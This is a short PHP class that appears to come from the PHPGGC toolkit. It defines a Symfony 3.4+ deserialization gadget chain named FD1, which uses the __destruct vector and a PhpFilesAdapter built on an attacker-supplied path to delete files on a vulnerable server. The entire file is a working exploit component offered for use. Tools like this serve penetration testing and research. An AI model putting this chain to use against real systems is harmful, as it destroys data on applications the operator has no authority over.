<?php

namespace GadgetChain\Symfony;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '-3.4+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \Symfony\Component\Cache\Adapter\PhpFilesAdapter($parameters['remote_path']);
    }
}